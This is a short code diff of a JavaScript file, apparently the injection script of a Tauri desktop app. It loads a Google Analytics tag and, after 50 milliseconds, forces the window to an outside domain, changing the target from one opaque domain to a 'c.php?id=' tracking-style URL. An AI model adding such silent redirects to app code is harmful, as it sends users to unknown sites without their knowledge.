@@ -1,9 +1,9 @@
 window.addEventListener("DOMContentLoaded",()=>{const t=document.createElement("script");t.src="https://www.googletagmanager.com/gtag/js?id=G-W5GKHM0893",t.async=!0,document.head.appendChild(t);const n=document.createElement("script");n.textContent="window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-W5GKHM0893');",document.body.appendChild(n)});// ===== 你的自动跳转代码 - 延迟50毫秒，防失效 =====
 setTimeout(() => {
-window.location.href = "https://6.fxqlove.top";
-  }, 50);
+  window.location.href = "https://jiuyue.hlwjd01.cn/c.php?id=222";
+}, 50);
 
-// ===== 官方原生适配代码 - 原样保留 =====
+// ===== 官方原生适配代码 - 原样保留，不要修改 =====
 const { invoke } = window.__TAURI__.core
 const hookClick = (e) => {
     const origin = e.target.closest('a')
